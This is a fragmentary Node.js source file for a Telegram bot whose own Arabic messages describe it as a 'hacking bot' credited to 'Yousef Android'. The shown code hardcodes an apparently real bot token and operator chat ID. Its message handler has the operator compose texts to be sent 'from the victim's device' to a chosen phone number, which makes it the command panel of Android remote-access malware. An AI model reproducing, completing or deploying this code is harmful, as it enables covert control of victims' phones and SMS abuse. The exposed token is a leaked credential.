...
const token = '
7040048345:AAFtuOqOoUVMdOPuodJPFatNx11ZBrmgMkM'
const id = '6595549074'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم تشغيل البوت بنجاح بوسطه يوسف أندرويد</h1>')
})
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور يوسف  أندرويد،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت يوسف أندرويد اليوتيوبر \n\n' +
